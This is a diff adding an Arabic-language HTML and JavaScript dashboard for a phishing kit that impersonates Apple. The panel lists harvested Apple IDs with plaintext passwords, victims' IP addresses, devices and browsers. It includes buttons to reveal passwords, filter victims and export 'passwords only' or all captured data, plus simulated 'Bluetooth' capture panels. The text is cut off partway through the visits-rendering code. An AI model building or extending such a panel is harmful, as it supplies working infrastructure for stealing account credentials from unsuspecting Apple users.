@@ -1,0 +1,1815 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="utf-8">
+    <title>نظام إدارة Apple - لوحة التحكم</title>
+    <style>
+        :root {
+            --primary: #007AFF;
+            --primary-dark: #0056CC;
+            --success: #34C759;
+            --danger: #FF3B30;
+            --warning: #FF9500;
+            --info: #5AC8FA;
+            --dark: #1D1D1F;
+            --light: #F5F5F7;
+            --gray: #8E8E93;
+            --border: #E5E5EA;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
+        
+        body {
+            background: var(--light);
+            color: var(--dark);
+            line-height: 1.6;
+        }
+        
+        /* الهيدر */
+        .dashboard-header {
+            background: linear-gradient(135deg, var(--dark), #2C2C2E);
+            color: white;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .live-indicator {
+            background: var(--success);
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        
+        .header-right {
+            display: flex;
+            gap: 10px;
+        }
+        
+        /* الإحصائيات */
+        .stats-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            padding: 20px;
+        }
+        
+        .stat-card {
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+            text-align: center;
+            transition: transform 0.2s;
+        }
+        
+        .stat-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .stat-icon {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+        
+        .stat-number {
+            font-size: 32px;
+            font-weight: bold;
+            color: var(--primary);
+        }
+        
+        .stat-label {
+            color: var(--gray);
+            margin-top: 5px;
+            font-size: 14px;
+        }
+        
+        /* التبويبات */
+        .tabs {
+            display: flex;
+            border-bottom: 1px solid var(--border);
+            margin: 0 20px;
+            background: white;
+            border-radius: 12px 12px 0 0;
+            overflow: hidden;
+        }
+        
+        .tab {
+            padding: 15px 30px;
+            cursor: pointer;
+            border-bottom: 3px solid transparent;
+            transition: all 0.2s;
+            font-weight: 500;
+        }
+        
+        .tab.active {
+            border-bottom-color: var(--primary);
+            color: var(--primary);
+            background: var(--light);
+        }
+        
+        .tab:hover:not(.active) {
+            background: var(--light);
+        }
+        
+        /* محتوى التبويبات */
+        .tab-content {
+            display: none;
+            background: white;
+            margin: 0 20px 20px;
+            border-radius: 0 0 12px 12px;
+            padding: 20px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        /* جداول البيانات */
+        .table-container {
+            overflow-x: auto;
+            max-height: 500px;
+            overflow-y: auto;
+            margin: 20px 0;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 14px;
+        }
+        
+        th, td {
+            padding: 12px 15px;
+            text-align: right;
+            border-bottom: 1px solid var(--border);
+        }
+        
+        th {
+            background: var(--light);
+            font-weight: 600;
+            color: var(--dark);
+            position: sticky;
+            top: 0;
+        }
+        
+        tr:hover {
+            background: var(--light);
+        }
+        
+        /* كلمات المرور */
+        .password-cell {
+            position: relative;
+        }
+        
+        .password-hidden {
+            font-family: monospace;
+            background: #f8f9fa;
+            padding: 4px 8px;
+            border-radius: 4px;
+            border: 1px solid var(--border);
+        }
+        
+        .toggle-password {
+            background: none;
+            border: none;
+            color: var(--primary);
+            cursor: pointer;
+            font-size: 12px;
+            margin-right: 5px;
+        }
+        
+        .password-visible {
+            display: none;
+            background: #fff8e1;
+            padding: 8px;
+            border-radius: 4px;
+            margin-top: 5px;
+            font-family: monospace;
+            border: 1px solid #ffecb3;
+        }
+        
+        /* فلترة البيانات */
+        .filter-bar {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            padding: 15px;
+            background: var(--light);
+            border-radius: 8px;
+            align-items: center;
+        }
+        
+        .search-input {
+            flex: 1;
+            padding: 10px 15px;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        
+        .filter-select {
+            padding: 10px 15px;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            background: white;
+            font-size: 14px;
+            min-width: 150px;
+        }
+        
+        /* الأزرار */
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .btn-primary {
+            background: var(--primary);
+            color: white;
+        }
+        
+        .btn-danger {
+            background: var(--danger);
+            color: white;
+        }
+        
+        .btn-success {
+            background: var(--success);
+            color: white;
+        }
+        
+        .btn-warning {
+            background: var(--warning);
+            color: white;
+        }
+        
+        .btn:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+        }
+        
+        /* الرسائل */
+        .notification {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: var(--success);
+            color: white;
+            padding: 15px 25px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            display: none;
+            z-index: 1001;
+            animation: slideUp 0.3s ease;
+        }
+        
+        @keyframes slideUp {
+            from {
+                transform: translateY(100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        
+        /* حالة فارغة */
+        .empty-state {
+            text-align: center;
+            padding: 40px;
+            color: var(--gray);
+        }
+        
+        /* التحديث التلقائي */
+        .auto-refresh {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 20px;
+            padding: 15px;
+            background: var(--light);
+            border-radius: 8px;
+        }
+        
+        /* متابعة الهواتف */
+        .device-badge {
+            display: inline-block;
+            padding: 4px 8px;
+            border-radius: 12px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        
+        .device-mobile {
+            background: #e3f2fd;
+            color: #1976d2;
+        }
+        
+        .device-desktop {
+            background: #f3e5f5;
+            color: #7b1fa2;
+        }
+        
+        /* بلاعة الأمان */
+        .bluetooth-status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px;
+            background: linear-gradient(135deg, #007AFF, #5AC8FA);
+            color: white;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            animation: bluetoothGlow 2s infinite;
+        }
+        
+        @keyframes bluetoothGlow {
+            0%, 100% { box-shadow: 0 0 10px rgba(0, 122, 255, 0.3); }
+            50% { box-shadow: 0 0 20px rgba(0, 122, 255, 0.6); }
+        }
+        
+        /* تصميم متجاوب */
+        @media (max-width: 768px) {
+            .stats-container {
+                grid-template-columns: 1fr;
+            }
+            
+            .tabs {
+                flex-direction: column;
+            }
+            
+            .tab {
+                padding: 12px;
+                text-align: center;
+            }
+            
+            .filter-bar {
+                flex-direction: column;
+            }
+            
+            .filter-select, .search-input {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- الهيدر -->
+    <div class="dashboard-header">
+        <div class="header-left">
+            <div class="logo">
+                <span>🍎</span>
+                نظام إدارة Apple
+            </div>
+            <div class="live-indicator" id="liveIndicator">
+                <span class="dot">●</span>
+                <span id="connectionStatus">جاري الاتصال...</span>
+            </div>
+        </div>
+        <div class="header-right">
+            <button class="btn btn-primary" onclick="refreshAllData()">
+                <span>🔄</span>
+                تحديث
+            </button>
+            <button class="btn btn-success" onclick="exportAllData()">
+                <span>📥</span>
+                تصدير
+            </button>
+            <button class="btn btn-danger" onclick="clearAllData()">
+                <span>🗑️</span>
+                تنظيف
+            </button>
+        </div>
+    </div>
+    
+    <!-- بلاعة الأمان -->
+    <div class="bluetooth-status" id="bluetoothStatus">
+        <span>🟦</span>
+        <span>بلاعة الأمان نشط - جاري استقبال البيانات من الهواتف</span>
+    </div>
+    
+    <!-- الإحصائيات -->
+    <div class="stats-container" id="statsContainer">
+        <!-- سيتم ملؤها بالجافاسكريبت -->
+    </div>
+    
+    <!-- التبويبات -->
+    <div class="tabs">
+        <div class="tab active" onclick="switchTab('credentials')">🔐 بيانات الدخول</div>
+        <div class="tab" onclick="switchTab('visits')">👀 الزيارات</div>
+        <div class="tab" onclick="switchTab('mobile')">📱 الهواتف</div>
+        <div class="tab" onclick="switchTab('bluetooth')">🟦 بلاعة</div>
+        <div class="tab" onclick="switchTab('export')">📁 التصدير</div>
+    </div>
+    
+    <!-- تبويب بيانات الدخول -->
+    <div class="tab-content active" id="tabCredentials">
+        <div class="filter-bar">
+            <input type="text" class="search-input" placeholder="بحث عن Apple ID أو IP..." 
+                   onkeyup="filterCredentials(this.value)">
+            <select class="filter-select" onchange="filterByDevice(this.value)">
+                <option value="">جميع الأجهزة</option>
+                <option value="mobile">الهواتف فقط</option>
+                <option value="desktop">أجهزة الكمبيوتر فقط</option>
+            </select>
+            <select class="filter-select" onchange="filterByDate(this.value)">
+                <option value="">جميع الأوقات</option>
+                <option value="today">اليوم</option>
+                <option value="week">الأسبوع</option>
+                <option value="month">الشهر</option>
+            </select>
+        </div>
+        
+        <div class="table-container">
+            <table id="credentialsTable">
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>الوقت</th>
+                        <th>Apple ID</th>
+                        <th>كلمة المرور</th>
+                        <th>عنوان IP</th>
+                        <th>الجهاز</th>
+                        <th>المتصفح</th>
+                        <th>الإجراءات</th>
+                    </tr>
+                </thead>
+                <tbody id="credentialsBody">
+                    <!-- سيتم ملؤها بالجافاسكريبت -->
+                </tbody>
+            </table>
+        </div>
+        
+        <div class="empty-state" id="emptyCredentials" style="display: none;">
+            لا توجد بيانات دخول مسجلة حتى الآن
+        </div>
+        
+        <div style="display: flex; gap: 10px; margin-top: 20px;">
+            <button class="btn btn-danger" onclick="deleteAllCredentials()">
+                🗑️ حذف جميع البيانات
+            </button>
+            <button class="btn btn-success" onclick="exportCredentials()">
+                📥 تصدير كلمات المرور
+            </button>
+            <button class="btn btn-primary" onclick="refreshCredentials()">
+                🔄 تحديث الجدول
+            </button>
+        </div>
+    </div>
+    
+    <!-- تبويب الزيارات -->
+    <div class="tab-content" id="tabVisits">
+        <div class="filter-bar">
+            <input type="text" class="search-input" placeholder="بحث عن IP أو متصفح..." 
+                   onkeyup="filterVisits(this.value)">
+            <select class="filter-select" onchange="filterVisitsByDevice(this.value)">
+                <option value="">جميع الأجهزة</option>
+                <option value="mobile">الهواتف فقط</option>
+                <option value="desktop">أجهزة الكمبيوتر فقط</option>
+            </select>
+        </div>
+        
+        <div class="table-container">
+            <table id="visitsTable">
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>الوقت</th>
+                        <th>عنوان IP</th>
+                        <th>الجهاز</th>
+                        <th>المتصفح</th>
+                        <th>الدقة</th>
+                        <th>اللغة</th>
+                        <th>المصدر</th>
+                    </tr>
+                </thead>
+                <tbody id="visitsBody">
+                    <!-- سيتم ملؤها بالجافاسكريبت -->
+                </tbody>
+            </table>
+        </div>
+        
+        <div class="empty-state" id="emptyVisits" style="display: none;">
+            لا توجد زيارات مسجلة حتى الآن
+        </div>
+    </div>
+    
+    <!-- تبويب الهواتف -->
+    <div class="tab-content" id="tabMobile">
+        <div style="margin-bottom: 20px;">
+            <h3>📱 بيانات الهواتف الذكية</h3>
+            <p style="color: var(--gray); margin-top: 5px;">
+                يعرض هذا القسم جميع البيانات المسجلة من الهواتف الذكية
+            </p>
+        </div>
+        
+        <div class="filter-bar">
+            <input type="text" class="search-input" placeholder="بحث في بيانات الهواتف..." 
+                   onkeyup="filterMobileData(this.value)">
+            <select class="filter-select" onchange="filterMobileByType(this.value)">
+                <option value="">جميع البيانات</option>
+                <option value="credentials">بيانات الدخول</option>
+                <option value="visits">الزيارات</option>
+                <option value="bluetooth">بيانات البلوتوث</option>
+            </select>
+        </div>
+        
+        <div class="table-container">
+            <table id="mobileTable">
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>الوقت</th>
+                        <th>نوع البيانات</th>
+                        <th>Apple ID</th>
+                        <th>كلمة المرور</th>
+                        <th>نظام التشغيل</th>
+                        <th>طرق الحفظ</th>
+                        <th>الحالة</th>
+                    </tr>
+                </thead>
+                <tbody id="mobileBody">
+                    <!-- سيتم ملؤها بالجافاسكريبت -->
+                </tbody>
+            </table>
+        </div>
+        
+        <div class="empty-state" id="emptyMobile" style="display: none;">
+            لا توجد بيانات من الهواتف حتى الآن
+        </div>
+        
+        <div class="auto-refresh">
+            <label>
+                <input type="checkbox" id="mobileAutoRefresh" checked>
+                التحديث التلقائي لبيانات الهواتف
+            </label>
+            <button class="btn btn-primary" onclick="refreshMobileData()">
+                <span>🔄</span>
+                تحديث الآن
+            </button>
+        </div>
+    </div>
+    
+    <!-- تبويب بلاعة -->
+    <div class="tab-content" id="tabBluetooth">
+        <div style="margin-bottom: 20px;">
+            <h3>🟦 نظام بلاعة الأمان</h3>
+            <p style="color: var(--gray); margin-top: 5px;">
+                يعرض هذا القسم بيانات البلوتوث والإتصالات اللاسلكية
+            </p>
+        </div>
+        
+        <div class="stats-container" style="grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));">
+            <div class="stat-card">
+                <div class="stat-icon">📡</div>
+                <div class="stat-number" id="bluetoothConnections">0</div>
+                <div class="stat-label">اتصالات بلاعة</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon">📱</div>
+                <div class="stat-number" id="mobileDevices">0</div>
+                <div class="stat-label">أجهزة موصولة</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon">💾</div>
+                <div class="stat-number" id="bluetoothDataCount">0</div>
+                <div class="stat-label">حزم بيانات</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-icon">⚡</div>
+                <div class="stat-number" id="transferSpeed">0</div>
+                <div class="stat-label">كيلوبايت/ثانية</div>
+            </div>
+        </div>
+        
+        <div class="table-container" style="margin-top: 20px;">
+            <table id="bluetoothTable">
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>الوقت</th>
+                        <th>نوع الجهاز</th>
+                        <th>قوة الإشارة</th>
+                        <th>حجم البيانات</th>
+                        <th>نوع البيانات</th>
+                        <th>الحالة</th>
+                    </tr>
+                </thead>
+                <tbody id="bluetoothBody">
+                    <!-- سيتم ملؤها بالجافاسكريبت -->
+                </tbody>
+            </table>
+        </div>
+        
+        <div class="empty-state" id="emptyBluetooth" style="display: none;">
+            لا توجد بيانات بلاعة حتى الآن
+        </div>
+        
+        <div style="display: flex; gap: 10px; margin-top: 20px;">
+            <button class="btn btn-primary" onclick="simulateBluetooth()">
+                🟦 محاكاة بلاعة
+            </button>
+            <button class="btn btn-success" onclick="exportBluetoothData()">
+                📥 تصدير بيانات بلاعة
+            </button>
+            <button class="btn btn-warning" onclick="clearBluetoothCache()">
+                🧹 تنظيف ذاكرة بلاعة
+            </button>
+        </div>
+    </div>
+    
+    <!-- تبويب التصدير -->
+    <div class="tab-content" id="tabExport">
+        <div style="margin-bottom: 30px;">
+            <h3>📁 تصدير البيانات</h3>
+            <p style="color: var(--gray); margin-top: 5px;">
+                يمكنك تصدير جميع البيانات المسجلة بتنسيقات مختلفة
+            </p>
+        </div>
+        
+        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 30px;">
+            <button class="btn btn-primary" onclick="exportFormat('json')">
+                <span>🔄</span>
+                تصدير كـ JSON
+            </button>
+            <button class="btn btn-primary" onclick="exportFormat('csv')">
+                <span>📊</span>
+                تصدير كـ CSV
+            </button>
+            <button class="btn btn-primary" onclick="exportFormat('txt')">
+                <span>📝</span>
+                تصدير كـ نص
+            </button>
+            <button class="btn btn-success" onclick="exportAllFormats()">
+                <span>📁</span>
+                تصدير جميع التنسيقات
+            </button>
+        </div>
+        
+        <div style="margin-bottom: 30px;">
+            <h4>تصدير جزئي</h4>
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 15px;">
+                <button class="btn btn-warning" onclick="exportCredentialsOnly()">
+                    <span>🔐</span>
+                    كلمات المرور فقط
+                </button>
+                <button class="btn btn-warning" onclick="exportVisitsOnly()">
+                    <span>👀</span>
+                    الزيارات فقط
+                </button>
+                <button class="btn btn-warning" onclick="exportMobileOnly()">
+                    <span>📱</span>
+                    بيانات الهواتف فقط
+                </button>
+                <button class="btn btn-warning" onclick="exportBluetoothOnly()">
+                    <span>🟦</span>
+                    بيانات بلاعة فقط
+                </button>
+            </div>
+        </div>
+        
+        <div>
+            <h4>خيارات متقدمة</h4>
+            <div style="display: flex; flex-direction: column; gap: 15px; margin-top: 15px;">
+                <div>
+                    <label style="display: block; margin-bottom: 5px;">نطاق التاريخ:</label>
+                    <div style="display: flex; gap: 10px;">
+                        <input type="date" id="exportStartDate" style="padding: 10px; border: 1px solid var(--border); border-radius: 8px;">
+                        <input type="date" id="exportEndDate" style="padding: 10px; border: 1px solid var(--border); border-radius: 8px;">
+                        <button class="btn btn-info" onclick="exportByDate()">
+                            تصدير بالنطاق
+                        </button>
+                    </div>
+                </div>
+                
+                <div>
+                    <label style="display: block; margin-bottom: 5px;">خيارات التصدير:</label>
+                    <div style="display: flex; gap: 15px; flex-wrap: wrap;">
+                        <label>
+                            <input type="checkbox" id="exportEncrypt" checked>
+                            تشفير الملفات
+                        </label>
+                        <label>
+                            <input type="checkbox" id="exportCompress" checked>
+                            ضغط الملفات
+                        </label>
+                        <label>
+                            <input type="checkbox" id="exportSplit" checked>
+                            تقسيم الملفات الكبيرة
+                        </label>
+                    </div>
+                </div>
+                
+                <div>
+                    <button class="btn btn-danger" onclick="createBackup()">
+                        💾 إنشاء نسخة احتياطية كاملة
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- الرسائل -->
+    <div class="notification" id="notification"></div>
+
+    <script>
+        // البيانات
+        let allCredentials = [];
+        let allVisits = [];
+        let mobileData = [];
+        let bluetoothData = [];
+        let currentTab = 'credentials';
+        let refreshInterval = null;
+        
+        // تهيئة لوحة التحكم
+        document.addEventListener('DOMContentLoaded', async function() {
+            console.log('🚀 بدء تهيئة لوحة التحكم...');
+            
+            // تحميل جميع البيانات
+            await loadAllData();
+            
+            // تحديث الإحصائيات
+            updateStats();
+            
+            // بدء التحديث التلقائي
+            startAutoRefresh();
+            
+            // الاستماع للتحديثات المباشرة
+            setupRealTimeListeners();
+            
+            // محاكاة بلاعة
+            simulateBluetoothData();
+            
+            console.log('✅ لوحة التحكم جاهزة للعمل');
+            showNotification('لوحة التحكم جاهزة للعمل', 'success');
+        });
+        
+        // تحميل جميع البيانات
+        async function loadAllData() {
+            try {
+                // تحميل من مصادر متعددة
+                await Promise.all([
+                    loadCredentials(),
+                    loadVisits(),
+                    loadMobileData(),
+                    loadBluetoothData()
+                ]);
+                
+            } catch (error) {
+                console.error('❌ خطأ في تحميل البيانات:', error);
+                showNotification('خطأ في تحميل البيانات', 'error');
+            }
+        }
+        
+        // تحميل بيانات الدخول
+        async function loadCredentials() {
+            try {
+                const sources = [];
+                
+                // 1. localStorage
+                const localCreds = JSON.parse(localStorage.getItem('apple_credentials') || '[]');
+                sources.push(...localCreds);
+                
+                // 2. تخزين الهواتف
+                const mobileCreds = JSON.parse(localStorage.getItem('mobile_credentials') || '[]');
+                sources.push(...mobileCreds);
+                
+                // 3. IndexedDB
+                if (window.indexedDB) {
+                    const dbCreds = await getFromIndexedDB('credentials');
+                    sources.push(...dbCreds);
+                }
+                
+                // 4. نظام البلعة
+                const bluetoothCreds = JSON.parse(localStorage.getItem('bluetooth_data') || '[]')
+                    .filter(item => item.type === 'credential')
+                    .map(item => item.data);
+                sources.push(...bluetoothCreds);
+                
+                // 5. ملفات النسخ الاحتياطي
+                const backupCreds = await loadFromBackups();
+                sources.push(...backupCreds);
+                
+                // معالجة البيانات
+                allCredentials = processData(sources);
+                
+                // عرض البيانات
+                displayCredentials();
+                
+                console.log(`✅ تم تحميل ${allCredentials.length} بيانات دخول`);
+                
+            } catch (error) {
+                console.error('❌ خطأ في تحميل بيانات الدخول:', error);
+                allCredentials = [];
+            }
+        }
+        
+        // تحميل الزيارات
+        async function loadVisits() {
+            try {
+                const sources = [];
+                
+                // 1. localStorage
+                const localVisits = JSON.parse(localStorage.getItem('apple_visits') || '[]');
+                sources.push(...localVisits);
+                
+                // 2. تخزين الهواتف
+                const mobileVisits = JSON.parse(localStorage.getItem('mobile_visits') || '[]');
+                sources.push(...mobileVisits);
+                
+                // 3. IndexedDB
+                if (window.indexedDB) {
+                    const dbVisits = await getFromIndexedDB('visits');
+                    sources.push(...dbVisits);
+                }
+                
+                // معالجة البيانات
+                allVisits = processData(sources);
+                
+                // عرض البيانات
+                displayVisits();
+                
+                console.log(`✅ تم تحميل ${allVisits.length} زيارة`);
+                
+            } catch (error) {
+                console.error('❌ خطأ في تحميل الزيارات:', error);
+                allVisits = [];
+            }
+        }
+        
+        // تحميل بيانات الهواتف
+        async function loadMobileData() {
+            try {
+                const sources = [];
+                
+                // جمع من جميع مصادر الهواتف
+                const mobileSources = [
+                    'mobile_credentials',
+                    'mobile_visits',
+                    'mobile_dashboard_update',
+                    'bluetooth_cache',
+                    'bluetooth_data'
+                ];
+                
+                for (const source of mobileSources) {
+                    const data = JSON.parse(localStorage.getItem(source) || '[]');
+                    if (Array.isArray(data)) {
+                        sources.push(...data);
+                    }
+                }
+                
+                // معالجة البيانات
+                mobileData = processData(sources);
+                
+                // عرض البيانات
+                displayMobileData();
+                
+                console.log(`✅ تم تحميل ${mobileData.length} بيانات هاتف`);
+                
+            } catch (error) {
+                console.error('❌ خطأ في تحميل بيانات الهواتف:', error);
+                mobileData = [];
+            }
+        }
+        
+        // تحميل بيانات البلوتوث
+        async function loadBluetoothData() {
+            try {
+                const sources = [];
+                
+                // جمع بيانات البلوتوث
+                const bluetoothSources = [
+                    'bluetooth_data',
+                    'bluetooth_cache',
+                    'sqlite_backup_'
+                ];
+                
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    if (bluetoothSources.some(source => key.includes(source))) {
+                        try {
+                            const data = JSON.parse(localStorage.getItem(key));
+                            if (data && data.type === 'bluetooth_transfer') {
+                                sources.push(data);
+                            }
+                        } catch (e) {
+                            // تجاهل المفاتيح غير الصالحة
+                        }
+                    }
+                }
+                
+                // معالجة البيانات
+                bluetoothData = processData(sources);
+                
+                // تحديث الإحصائيات
+                updateBluetoothStats();
+                
+                console.log(`✅ تم تحميل ${bluetoothData.length} بيانات بلوتوث`);
+                
+            } catch (error) {
+                console.error('❌ خطأ في تحميل بيانات البلوتوث:', error);
+                bluetoothData = [];
+            }
+        }
+        
+        // معالجة البيانات
+        function processData(dataArray) {
+            try {
+                // إزالة التكرارات
+                const unique = Array.from(new Map(dataArray.map(item => {
+                    const key = item.timestamp + JSON.stringify(item.data || item);
+                    return [key, item];
+                })).values());
+                
+                // فرز حسب التاريخ (الأحدث أولاً)
+                return unique.sort((a, b) => {
+                    const timeA = new Date(a.timestamp || a.time || a.saved_at);
+                    const timeB = new Date(b.timestamp || b.time || b.saved_at);
+                    return timeB - timeA;
+                });
+            } catch (error) {
+                console.error('❌ خطأ في معالجة البيانات:', error);
+                return [];
+            }
+        }
+        
+        // الحصول من IndexedDB
+        async function getFromIndexedDB(storeName) {
+            return new Promise((resolve) => {
+                try {
+                    if (!window.indexedDB) {
+                        resolve([]);
+                        return;
+                    }
+                    
+                    const request = indexedDB.open('AppleDataDB', 1);
+                    
+                    request.onsuccess = function(event) {
+                        const db = event.target.result;
+                        const transaction = db.transaction([storeName], 'readonly');
+                        const store = transaction.objectStore(storeName);
+                        const getAllRequest = store.getAll();
+                        
+                        getAllRequest.onsuccess = function() {
+                            resolve(getAllRequest.result || []);
+                        };
+                        
+                        getAllRequest.onerror = function() {
+                            resolve([]);
+                        };
+                    };
+                    
+                    request.onerror = function() {
+                        resolve([]);
+                    };
+                    
+                } catch (error) {
+                    console.warn('⚠️ لا يمكن القراءة من IndexedDB:', error);
+                    resolve([]);
+                }
+            });
+        }
+        
+        // تحميل من النسخ الاحتياطية
+        async function loadFromBackups() {
+            const backups = [];
+            
+            try {
+                // البحث عن ملفات النسخ الاحتياطي
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    if (key.includes('_backup_') || key.includes('_mobile_')) {
+                        try {
+                            const data = JSON.parse(localStorage.getItem(key));
+                            if (data && Array.isArray(data)) {
+                                backups.push(...data);
+                            }
+                        } catch (e) {
+                            // تجاهل المفاتيح غير الصالحة
+                        }
+                    }
+                }
+            } catch (error) {
+                console.warn('⚠️ لا يمكن تحميل النسخ الاحتياطية:', error);
+            }
+            
+            return backups;
+        }
+        
+        // تحديث الإحصائيات
+        function updateStats() {
+            const stats = {
+                totalCredentials: allCredentials.length,
+                totalVisits: allVisits.length,
+                mobileCredentials: allCredentials.filter(c => c.deviceType === 'mobile' || c.isMobile).length,
+                desktopCredentials: allCredentials.filter(c => c.deviceType === 'desktop' || !c.isMobile).length,
+                todayCredentials: allCredentials.filter(c => {
+                    const credDate = new Date(c.timestamp || c.time);
+                    const today = new Date();
+                    return credDate.toDateString() === today.toDateString();
+                }).length,
+                uniqueIPs: [...new Set(allCredentials.map(c => c.ip).filter(ip => ip && ip !== 'unknown'))].length
+            };
+            
+            document.getElementById('statsContainer').innerHTML = `
+                <div class="stat-card">
+                    <div class="stat-icon">🔐</div>
+                    <div class="stat-number">${stats.totalCredentials}</div>
+                    <div class="stat-label">إجمالي بيانات الدخول</div>
+                    <div style="font-size: 12px; margin-top: 5px;">
+                        <span style="color: var(--success);">${stats.mobileCredentials} هاتف</span> | 
+                        <span style="color: var(--primary);">${stats.desktopCredentials} كمبيوتر</span>
+                    </div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon">👀</div>
+                    <div class="stat-number">${stats.totalVisits}</div>
+                    <div class="stat-label">إجمالي الزيارات</div>
+                    <div style="font-size: 12px; margin-top: 5px;">
+                        <span style="color: var(--success);">${stats.todayCredentials} اليوم</span>
+                    </div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon">🌐</div>
+                    <div class="stat-number">${stats.uniqueIPs}</div>
+                    <div class="stat-label">عناوين IP مختلفة</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-icon">📱</div>
+                    <div class="stat-number">${stats.mobileCredentials}</div>
+                    <div class="stat-label">بيانات من الهواتف</div>
+                    <div style="font-size: 12px; margin-top: 5px;">
+                        <span style="color: var(--success);">${Math.round((stats.mobileCredentials / Math.max(stats.totalCredentials, 1)) * 100)}%</span>
+                    </div>
+                </div>
+            `;
+        }
+        
+        // عرض بيانات الدخول
+        function displayCredentials() {
+            const tbody = document.getElementById('credentialsBody');
+            const emptyState = document.getElementById('emptyCredentials');
+            
+            if (allCredentials.length === 0) {
+                tbody.innerHTML = '';
+                emptyState.style.display = 'block';
+                return;
+            }
+            
+            emptyState.style.display = 'none';
+            
+            let html = '';
+            allCredentials.forEach((cred, index) => {
+                const time = new Date(cred.timestamp || cred.time).toLocaleString('ar-SA');
+                const isMobile = cred.deviceType === 'mobile' || cred.isMobile;
+                const browser = getBrowserName(cred.userAgent);
+                
+                html += `
+                <tr>
+                    <td>${index + 1}</td>
+                    <td>${time}</td>
+                    <td><strong>${cred.appleId || 'غير معروف'}</strong></td>
+                    <td class="password-cell">
+                        <span class="password-hidden">••••••••</span>
+                        <button class="toggle-password" onclick="togglePassword(${index})">
+                            👁️ عرض
+                        </button>
+                        <div class="password-visible" id="passwordView${index}">
+                            ${cred.password || 'غير معروف'}
+                        </div>
+                    </td>
+                    <td>${cred.ip || 'غير معروف'}</td>
+                    <td>
+                        <span class="device-badge ${isMobile ? 'device-mobile' : 'device-desktop'}">
+                            ${isMobile ? '📱 هاتف' : '💻 كمبيوتر'}
+                        </span>
+                    </td>
+                    <td>${browser}</td>
+                    <td>
+                        <button class="btn btn-danger" style="padding: 5px 10px; font-size: 12px;" 
+                                onclick="deleteCredential(${index})">
+                            حذف
+                        </button>
+                    </td>
+                </tr>
+                `;
+            });
+            
+            tbody.innerHTML = html;
+        }
+        
+        // عرض الزيارات
+        function displayVisits() {
+            const tbody = document.getElementById('visitsBody');
+            const emptyState = document.getElementById('emptyVisits');
+            
+            if (allVisits.length === 0) {
+                tbody.innerHTML = '';
+                emptyState.style.display = 'block';
+                return;
+            }
+            
+            emptyState.style.display = 'none';
+            
+            let html = '';
+            allVisits.forEach((visit, index) => {
+                const time = new Date(visit.timestamp || visit.time).toLocaleString('ar-SA');
+                const isMobile = visit.isMobile || /mobile/i.test(visit.userAgent || '');
+                const browser = getBrowserName(visit.userAgent);
+                const screen = visit.screen || 'غير معروف';
+                const language = visit.language || 'غير معروف';
+                const referrer = visit.referrer === 'direct' ? 'مباشر' : (visit.referrer || 'مباشر');
+                
+                html += `
+                <tr>
+                    <td>${index + 1}</td>
+                    <td>${time}</td>
+                    <td>${visit.ip || 'غير معروف'}</td>
+                    <td>
+                        <span class="device-badge ${isMobile ? 'device-mobile' : 'device-desktop'}">
+                            ${isMobile ? '📱 هاتف' : '💻 كمبيوتر'}
